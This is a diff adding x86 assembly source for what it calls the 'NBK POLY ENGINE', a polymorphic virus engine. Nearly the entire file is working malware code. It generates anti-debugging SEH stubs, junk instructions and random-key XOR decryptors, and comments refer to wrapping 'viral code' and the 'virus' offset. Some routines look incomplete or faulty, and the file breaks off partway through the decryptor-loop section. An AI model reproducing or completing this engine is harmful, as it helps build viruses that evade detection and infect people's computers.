@@ -1,0 +1,1171 @@
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         NBK POLY ENGINE           *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+engine:
+
+; entry:
+; esi = offset 2 viral code
+; edi = offset 2 put code (virus size + 700 bytes, at least)
+; ebx = RVA + Image Base of edi
+; ecx = size of viral code in 'dwords'
+
+pushad                        ;
+
+mov dword ptr [ebp+ofsvir],esi;
+mov dword ptr [ebp+len],ecx   ;
+mov [ebp+_RVA],ebx            ; Save RVA
+mov [ebp+all_ini],edi         ; Save initial pointer
+                              ; (runtime offsets)
+                              ;
+xor dl,dl                     ; erase some flags
+xor bl,bl                     ;
+                              ;
+call SEH                      ; SEH :-)
+                              ;
+call CRYPT                    ; POLY decryptor
+
+popad
+ret
+
+
+SEH proc
+
+pushad
+
+; 1) push offset 6
+; 2) xor ebx,ebx
+;        edx,edx
+;        eax,eax
+; 3) push dword ptr fs:[0]    ;6467FF360000
+;                   fs:[eax]  ;64FF30 - 48D
+;                   fs:[ebx]  ;64FF33 - 51D
+;                   fs:[edx]  ;64FF32 - 50D
+; 4) mov dword ptr fs:[0],esp ;646789260000
+;                  fs:[eax]   ;648920 - 32D
+;                  fs:[ebx]   ;648923 - 35D
+;                  fs:[edx]   ;648922 - 34D
+; 5) int 03h
+; 6) untrace
+; 7) mov esp,dword ptr [esp+8]
+; 8) xor ebx,ebx
+;        edx,edx
+;        eax,eax
+; 9) pop dword ptr fs:[0]
+;                  fs:[ebx]
+;                  fs:[edx]
+;                  fs:[eax]
+; 10) add esp,4
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         CHOOSE REG          *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+@@1:                          ;
+in al,40H                     ;
+cmp al,0C0H                   ; eax = 192 = 48
+je put_reg                    ;
+cmp al,0DBH                   ; ebx = 219 = 51
+je put_reg                    ;
+cmp al,0D2H                   ; edx = 210 = 50
+je put_reg                    ;
+cmp al,00H                    ; no reg ?
+je put_reg                    ;
+jmp @@1                       ;
+put_reg:                      ;
+mov byte ptr [ebp+xor_reg],al ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+call chg_garble
+
+mov [ebp+ofs ini_SEH],edi
+
+@@30:
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         PUSH mem PUSH reg   *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+in al,40H                     ;
+and al,0001b                  ;
+jz @@21                       ;
+                              ;
+mov al,68H                    ; generate PUSH
+stosb                         ;
+                              ;
+mov [ebp+ofs off1],edi        ; Save this offset
+xor eax,eax                   ;
+stosd                         ;
+                              ;
+jmp short @@22                ;
+                              ;
+@@21:                         ;
+                              ;
+call mov_reg                  ;
+sub al,08H                    ;
+stosb                         ;
+push eax                      ;
+mov [ebp+ofs off1],edi        ;
+xor eax,eax                   ;
+stosd                         ;
+pop eax                       ;
+add al,08H                    ;
+mov dl,99H                    ;
+mov bl,99H                    ;
+call push_pop                 ;
+xor dl,dl                     ;
+xor bl,bl                     ;
+                              ;
+@@22:                         ;
+                              ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+call chg_garble
+
+@@31:
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         XOR ? SUB -> REG    *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+mov bl,byte ptr [ebp+xor_reg] ;
+or bl,bl                      ;
+jz @@2                        ;
+                              ;
+in al,40H                     ;
+and al,0001H                  ;
+jz @@19                       ;
+                              ;
+mov al,33H                    ; XOR
+stosb                         ;
+                              ;
+jmp short @@20                ;
+                              ;
+@@19:                         ;
+                              ;
+mov al,2BH                    ; SUB
+stosb                         ;
+                              ;
+@@20:                         ;
+                              ;
+mov al,bl                     ;
+stosb                         ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+@@2:
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         PUSH DWORD PTR FS:[]*
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+mov al,64H
+stosb
+
+mov bl,byte ptr [ebp+xor_reg]
+or bl,bl
+jz @@3
+
+mov al,0FFH
+stosb
+
+mov al,bl
+
+cmp al,0C0H                   ; eax
+je @@4
+
+cmp al,0DBH                   ; ebx
+je @@5
+
+cmp al,0D2H                   ; edx
+je @@6
+
+jmp short $
+
+@@3:                          ; 67FF360000 fs:[0]
+mov eax,0036FF67H
+stosd
+xor al,al
+
+@@7:
+
+mov cl,al                     ; Save this reg in cl
+stosb
+jmp @@8
+
+@@4:
+
+mov al,30H
+jmp @@7
+
+@@5:
+
+mov al,33H
+jmp @@7
+
+@@6:
+
+mov al,32H
+jmp @@7
+
+@@8:
+
+;call chg_garble    ; error
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         MOV DWORD PTR FS:[?],esp*
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+mov al,64H
+stosb
+
+mov bl,byte ptr [ebp+xor_reg]
+or bl,bl
+jz @@9                        ; no regs
+
+mov al,89H
+stosb
+
+mov al,cl                     ; Get used reg
+sub al,10H                    ; ...
+jmp @@10
+
+@@9:
+
+mov eax,00268967H             ; 6789260000
+stosd
+
+xor al,al
+
+@@10:
+
+stosb
+
+call chg_garble
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         EXCEPTION           *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+mov al,0CCH                   ; int 03H
+stosb                         ;
+                              ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+call chg_garble
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         UNTRACE             *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+mov al,0E9H                   ;
+stosb                         ;
+                              ;
+call rnd                      ;
+stosd                         ;
+                              ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+call chg_garble
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         MOV ESP,DWORD PTR [ESP+08]*
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+mov [ebp+ofs off6],edi        ;
+
+call chg_garble
+
+mov al,08BH                   ;
+stosb                         ;
+in al,40H                     ;
+and al,0001b                  ;
+jz @@23                       ;
+mov ax,2464H                  ; 642408
+stosw                         ;
+mov al,08H                    ;
+stosb                         ;
+jmp short @@29                ;
+@@23:                         ;
+call mov_reg                  ;
+push eax
+cmp al,0C0H
+je @@24
+cmp al,0C1H
+je @@25
+cmp al,0C2H
+je @@26
+cmp al,0C3H
+je @@27
+jmp short $
+@@24:
+mov al,44H
+jmp @@28
+@@25:
+mov al,4CH
+jmp @@28
+@@26:
+mov al,54H
+jmp @@28
+@@27:
+mov al,5CH
+@@28:
+stosb
+mov ax,0824H
+stosw
+mov al,8BH
+stosb
+pop eax
+add al,20H
+stosb
+@@29:
+                              ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+call chg_garble
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         XOR ? SUB -> REG    *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+mov bl,byte ptr [ebp+xor_reg] ;
+or bl,bl                      ;
+jz @@11                       ;
+                              ;
+in al,40H                     ;
+and al,0001H                  ;
+jz @@16                       ;
+                              ;
+mov al,33H                    ; XOR
+stosb                         ;
+                              ;
+jmp short @@18                ;
+                              ;
+@@16:                         ;
+                              ;
+mov al,2BH                    ; SUB
+stosb                         ;
+                              ;
+@@18:                         ;
+                              ;
+mov al,bl                     ;
+stosb                         ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         POP DWORD PTR FS:[?]*
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+@@11:                         ;
+                              ;
+mov al,64H                    ;
+stosb                         ;
+                              ;
+or bl,bl                      ;
+jz @@12                       ;
+                              ;
+mov al,8FH                    ;
+stosb                         ;
+                              ;
+mov al,cl                     ;
+sub al,30H                    ;
+jmp @@13                      ;
+                              ;
+@@12:                         ;
+                              ;
+mov eax,00068F67H             ; 678F060000
+stosd                         ;
+                              ;
+xor al,al                     ;
+@@13:                         ;
+stosb                         ;
+                              ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+call chg_garble
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         ADD ESP,4           *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+in al,40H                     ;
+and al,0001H                  ;
+jz @@14                       ;
+                              ;
+mov ax,0C483H                 ;
+stosw                         ;
+                              ;
+mov al,04H                    ;
+stosb                         ;
+                              ;
+jmp short @@15                ;
+                              ;
+@@14:                         ;
+                              ;
+mov ax,0EC83H                 ;
+stosw                         ;
+                              ;
+mov al,0FCH                   ;
+stosb                         ;
+                              ;
+@@15:                         ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+call chg_garble
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+;mov [ebp+ofs wahoo],edi       ;
+                              ;
+mov eax,[ebp+ini_SEH]         ;
+sub eax,[ebp+all_ini]         ;
+mov edx,eax                   ;
+                              ;
+mov eax,[ebp+off6]            ;
+sub eax,[ebp+off1]            ;
+                              ;
+mov ebx,[ebp+_RVA]            ;
+add ebx,edx                   ;
+add ebx,eax                   ;
+add ebx,3                     ;
+                              ;
+mov eax,[ebp+ofs off1]        ;
+mov [eax],ebx                 ;
+                              ;
+mov dr0,edi                   ;
+popad                         ;
+mov edi,dr0                   ;
+ret                           ;
+                              ;
+ini_SEH   dd 0                ;
+;wahoo     dd 0                ;
+;siz       dd 0                ;
+off1      dd 0                ;
+off6      dd 0                ;
+all_ini   dd 0                ;
+xor_reg   db 0                ;
+_RVA      dd 0                ;
+len       dd 0                ;
+ofsvir    dd 0                ;
+                              ;
+SEH endp                      ;
+                              ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         GARBAGE GENERATOR   *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+garbage proc                  ;
+                              ;
+push eax                      ;
+push esi                      ;
+xor eax,eax                   ;
+in al,40H                     ;
+and al,0001b                  ;
+jz @@1                        ;
+in al,40H                     ;
+not al                        ;
+jmp short @@2                 ;
+@@1:                          ;
+in al,40H                     ;
+@@2:                          ;
+and al,00111100b              ;
+lea esi,[ebp+ofs GARBAGE_TABLE0]
+add esi,eax                   ;
+mov esi,dword ptr [esi]       ;
+add esi,ebp                   ;
+call esi                      ;
+pop esi                       ;
+pop eax                       ;
+ret                           ;
+                              ;
+garbage endp                  ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         GARBAGE GENERATOR   *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+garbage1 proc                 ;
+push eax                      ;
+push esi                      ;
+xor eax,eax                   ;
+in al,40H                     ;
+and al,1100b                  ;
+lea esi,[ebp+ofs GARBAGE_TABLE1]
+add esi,eax                   ;
+mov esi,dword ptr [esi]       ;
+add esi,ebp                   ;
+call esi                      ;
+pop esi                       ;
+pop eax                       ;
+garbage1 endp                 ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         GARBAGE TABLE 0     *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+GARBAGE_TABLE0:               ;
+                              ;
+dd ofs mov_eax                ;
+dd ofs mov_ah                 ;
+dd ofs add_al                 ;
+dd ofs sub_ebx                ;
+dd ofs shl_reg_cl             ;
+dd ofs xchg_edx               ;
+dd ofs or_reg_reg             ;
+dd ofs push_pop               ;
+dd ofs test_eax               ;
+dd ofs xor_reg_num            ;
+dd ofs jump                   ;
+dd ofs neg_reg                ;
+dd ofs adc_reg                ;
+dd ofs adc_reg_num            ;
+dd ofs and_reg_num            ;
+dd ofs bt_reg_reg             ;
+                              ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         GARBAGE TABLE 1     *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+GARBAGE_TABLE1:               ; preserv regs
+                              ;
+dd ofs jump                   ;
+dd ofs mov_dr0                ;
+dd ofs cmp_eax                ;
+dd ofs test_eax               ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         CHG_GARBLE          *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+chg_garble proc               ;
+push eax                      ;
+call garbage                  ;
+in al,40H                     ;
+and al,0001b                  ;
+jnz @@38                      ;
+call garbage                  ;
+in al,40H                     ;
+and al,0001b                  ;
+jz @@38                       ;
+call garbage                  ;
+call garbage                  ;
+in al,40H                     ;
+and al,0001b                  ;
+jz @@37                       ;
+@@38:                         ;
+call garbage                  ;
+@@37:                         ;
+pop eax                       ;
+ret                           ;
+chg_garble endp               ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         CHG_GARBLE          *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+chg_garble1 proc              ;
+push eax                      ;
+call garbage1                 ;
+in al,40H                     ;
+and al,0001b                  ;
+jnz @@38                      ;
+call garbage1                 ;
+in al,40H                     ;
+and al,0001b                  ;
+jz @@38                       ;
+call garbage1                 ;
+call garbage1                 ;
+in al,40H                     ;
+and al,0001b                  ;
+jz @@37                       ;
+@@38:                         ;
+call garbage1                 ;
+@@37:                         ;
+pop eax                       ;
+ret                           ;
+chg_garble1 endp              ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         MOV EAX, ?          *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+mov_eax proc                  ;
+push eax                      ;
+in al,40H                     ;
+and al,0001b                  ;
+jz @@1                        ;
+mov al,8BH                    ;
+cmp byte ptr [edi-2],al       ;
+je @@1                        ;
+stosb                         ;
+call mov_reg                  ;
+stosb                         ;
+jmp @@2                       ;
+@@1:                          ;
+mov al,0B8H                   ;
+cmp byte ptr [edi-5],al       ;
+je @@2                        ;
+stosb                         ;
+call rnd                      ;
+stosd                         ;
+@@2:                          ;
+pop eax                       ;
+ret                           ;
+mov_eax endp                  ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         AL = C0, C1, C2, C3 *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+mov_reg proc                  ;
+@@1:                          ;
+in al,40H                     ;
+cmp al,0C0H                   ;
+je @@2                        ;
+cmp al,0C1H                   ;
+je @@2                        ;
+cmp al,0C2H                   ;
+je @@2                        ;
+cmp al,0C3H                   ;
+je @@2                        ;
+jmp @@1                       ;
+@@2:                          ;
+ret                           ;
+mov_reg endp                  ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         MOV AH,??           *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+mov_ah proc                   ;
+push eax                      ;
+mov al,0B4H                   ;
+cmp byte ptr [edi-2],al       ;
+je @@1                        ;
+stosb                         ;
+in al,40H                     ;
+stosb                         ;
+@@1:                          ;
+pop eax                       ;
+ret                           ;
+mov_ah endp                   ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         ADD AL,REG          *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+add_al proc                   ;
+push eax                      ;
+mov al,2                      ;
+stosb                         ;
+call mov_reg                  ;
+stosb                         ;
+@@1:                          ;
+pop eax                       ;
+ret                           ;
+add_al endp                   ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         SUB EBX,REG         *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+sub_ebx proc                  ;
+push eax                      ;
+mov al,2BH                    ;
+stosb                         ;
+call mov_reg                  ;
+add al,18H                    ;
+stosb                         ;
+@@1:                          ;
+pop eax                       ;
+ret                           ;
+sub_ebx endp                  ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         XCHG EDX,REG        *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+xchg_edx proc                 ;
+push eax                      ;
+mov al,87H                    ;
+stosb                         ;
+@@2:                          ;
+call mov_reg                  ;
+cmp al,0C0H                   ;
+je @@2                        ;
+add al,10H                    ;
+stosb                         ;
+@@1:                          ;
+pop eax                       ;
+ret                           ;
+xchg_edx endp                 ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         MOV DR0,REG         *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+mov_dr0 proc                  ;
+push eax                      ;
+mov ax,230FH                  ;
+stosw                         ;
+call mov_reg                  ;
+stosb                         ;
+@@1:                          ;
+pop eax                       ;
+ret                           ;
+mov_dr0 endp                  ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         TEST EAX,REG        *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+test_eax proc                 ;
+push eax                      ;
+mov al,85H                    ;
+stosb                         ;
+call mov_reg                  ;
+stosb                         ;
+pop eax                       ;
+ret                           ;
+test_eax endp                 ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         CMP EAX,REG         *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+cmp_eax proc                  ;
+push eax                      ;
+mov al,3BH                    ;
+stosb                         ;
+call mov_reg                  ;
+stosb                         ;
+pop eax                       ;
+ret                           ;
+cmp_eax endp                  ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         NEG REG             *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+neg_reg proc                  ;
+push eax                      ;
+mov al,0F7H                   ;
+cmp byte ptr [edi-2],al       ;
+je @@1                        ;
+stosb                         ;
+call mov_reg                  ;
+add al,18H                    ;
+stosb                         ;
+@@1:                          ;
+pop eax                       ;
+ret                           ;
+neg_reg endp                  ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         ADC REG             *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+adc_reg proc                  ;
+push eax                      ;
+mov al,13H                    ;
+stosb                         ;
+call mov_reg                  ;
+stosb                         ;
+pop eax                       ;
+ret                           ;
+adc_reg endp                  ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         ADC REG             *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+adc_reg_num proc              ;
+push eax                      ;
+mov al,81H                    ;
+stosb                         ;
+@@2:                          ;
+call mov_reg                  ;
+cmp al,0C0H                   ;
+je @@2                        ;
+add al,10H                    ;
+stosb                         ;
+call rnd                      ;
+stosd                         ;
+pop eax                       ;
+ret                           ;
+adc_reg_num endp              ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         AND REG,????        *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+and_reg_num proc              ;
+push eax                      ;
+mov al,81H                    ;
+cmp byte ptr [edi-6],al       ;
+je @@1                        ;
+stosb                         ;
+@@2:                          ;
+call mov_reg                  ;
+cmp al,0C0H                   ;
+je @@2                        ;
+add al,20H                    ;
+stosb                         ;
+call rnd                      ;
+stosd                         ;
+@@1:                          ;
+pop eax                       ;
+ret                           ;
+and_reg_num endp              ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         BT REG,REG          *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+bt_reg_reg proc               ;
+push eax                      ;
+cmp byte ptr [edi-3],0FH      ;
+je @@1                        ;
+mov ax,0A30FH                 ;
+stosw                         ;
+call mov_reg                  ;
+stosb                         ;
+@@1:                          ;
+pop eax                       ;
+ret                           ;
+bt_reg_reg endp               ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         OR REG,REG          *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+or_reg_reg proc               ;
+push eax                      ;
+mov al,0AH                    ;
+stosb                         ;
+call mov_reg                  ;
+stosb                         ;
+pop eax                       ;
+ret                           ;
+or_reg_reg endp               ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         XOR REG16,??        *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+xor_reg_num proc              ;
+push eax                      ;
+mov ax,8166H                  ;
+stosw                         ;
+@@2:                          ;
+call mov_reg                  ;
+cmp al,0C0H                   ;
+je @@2                        ;
+add al,30H                    ;
+stosb                         ;
+call rnd                      ;
+stosw                         ;
+pop eax                       ;
+ret                           ;
+xor_reg_num endp              ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         SHL E?X,CL          *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+shl_reg_cl proc               ;
+push eax                      ;
+mov al,0D3H                   ;
+cmp byte ptr [edi-2],al       ;
+je @@1                        ;
+stosb                         ;
+call mov_reg                  ;
+add al,20H                    ;
+stosb                         ;
+@@1:                          ;
+pop eax                       ;
+ret                           ;
+shl_reg_cl endp               ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         PUSH_POP E?X        *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+push_pop proc                 ;
+push eax                      ;
+cmp dl,99H                    ;
+je @@1                        ;
+call mov_reg                  ;
+@@1:                          ;
+sub al,70H                    ;
+stosb                         ;
+                              ;
+call chg_garble               ;
+                              ;
+cmp bl,99H                    ; Only PUSH ?
+je @@2                        ;
+add al,08H                    ;
+stosb                         ;
+@@2:                          ;
+pop eax                       ;
+ret                           ;
+push_pop endp                 ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         JUMP GENERATOR      *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+jump proc                     ;
+pushad                        ;
+xor edx,edx                   ;
+call rnd                      ;
+and eax,01111110b             ; 126
+mov ecx,eax                   ;
+mov bl,al                     ;
+mov al,0EBH                   ;
+stosb                         ;
+mov al,bl                     ;
+stosb                         ;
+@@1:                          ;
+call rnd                      ;
+stosb                         ;
+loop @@1                      ;
+mov dr0,edi                   ;
+popad                         ;
+mov edi,dr0                   ;
+ret                           ;
+jump endp                     ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         CHANGE EDI          *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ; IF DL = 1
+ch_edi proc                   ; A RANDOMIC DWORD
+push eax                      ; WILL BE USED
+in al,40H                     ;
+and al,0001b                  ; IF NOT, THE NEXT
+jz @@1                        ; ROUTINE HAVE TO STORE
+mov ax,0FF33H                 ; A DWORD
+stosw                         ;
+mov ax,0C781H                 ;
+stosw                         ;
+jmp short @@2                 ;
+@@1:                          ;
+mov al,0BFH                   ;
+stosb                         ;
+@@2:                          ;
+cmp dl,99H                    ;
+je @@3                        ;
+@@4:                          ;
+pop eax                       ;
+ret                           ;
+@@3:                          ;
+call rnd                      ;
+stosd                         ;
+jmp @@4                       ;
+ch_edi endp                   ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         CRYPT CODE          *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+
+CRYPT proc
+
+; 1) mov edi, 'CODE_OFFSET_RUNTIME'
+; 2) mov ecx, 'VIRUS_LENGHT'
+; 3) mov /eax/ebx/edx/, DWORD PTR [edi]
+; 4) xor /eax/ebx/edx/, KEY
+; 5) add/sub /eax/ebx/edx/, BYTE
+
+mov [ebp+_off1],edi           ; PROC init
+
+call edi_ofs
+mov ecx,dword ptr [ebp+len]
+call len_ecx
+call edi2eax
+push edi
+call xor_eax
+call eax2edi
+call add_edi
+pop ebx
+sub ebx,2                     ; Back to instruction
+call do_loop
+
+mov eax,edi
+sub eax,[ebp+all_ini]         ; EAX = decryptor size
+add eax,[ebp+_RVA]
+add eax,2
+mov esi,[ebp+_off2]
+mov [esi],eax
+push edi                      ; Save end of
+
+mov ecx,dword ptr [ebp+len]
+mov esi,dword ptr [ebp+ofsvir];
+rep movsd                     ; copy it
+
+pop edi
+push edi
+sub edi,[ebp+_off1]
+mov eax,edi
+mov ebx,[ebp+_off3]
+mov esi,ebx
+lea edi,[ebp+ofs buff]
+mov ecx,eax
+mov edx,30
+sub edx,ecx
+rep movsb
+mov al,90H
+mov ecx,edx
+sub ecx,2
+rep stosb
+pop edi
+
+buff db 30 dup (90H)
+
+db 6 dup (0C3H)
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;         EDI_OFFSET          *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+edi_ofs proc                  ;
+push eax                      ;
+mov al,0BFH                   ;
+stosb                         ;
+mov [ebp+_off2],edi           ; mov edi,offset virus
+xor eax,eax                   ;
+stosd                         ;
+pop eax                       ;
+ret                           ;
+edi_ofs endp                  ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;        MOV ECX,LENGHT       *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+len_ecx proc                  ;
+push eax                      ;
+mov [ebp+_off3],edi           ;
+mov al,0B9H                   ;
+stosb                         ;
+mov eax,ecx                   ;
+stosd                         ;
+pop eax                       ;
+ret                           ;
+len_ecx endp                  ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;        [EDI] - > EAX        *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+edi2eax proc                  ;
+push eax                      ;
+mov ax,078BH                  ; mov eax,dword ptr [edi]
+stosw                         ;
+pop eax                       ;
+ret                           ;
+edi2eax endp                  ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;        XOR EAX, ????        *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+xor_eax proc                  ;
+push eax                      ;
+mov al,35H                    ; XOR EAX, ????
+stosb                         ;
+call rnd                      ;
+stosd                         ; rnd dword
+pop eax                       ;
+ret                           ;
+xor_eax endp                  ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;        EAX -> [EDI]         *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+eax2edi proc                  ;
+push eax                      ;
+mov ax,0789H                  ; mov dword ptr [edi],eax
+stosw                         ;
+pop eax                       ;
+ret                           ;
+eax2edi endp                  ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;        ADD EDI,4            *
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+                              ;
+add_edi proc                  ;
+push eax                      ;
+mov ax,0C783H                 ;
+stosw                         ;
+mov al,4                      ;
+stosb                         ;
+pop eax                       ;
+ret                           ;
+add_edi endp                  ;
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+
+
+;*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+
+;        LOOP DECRYPT_INI     *
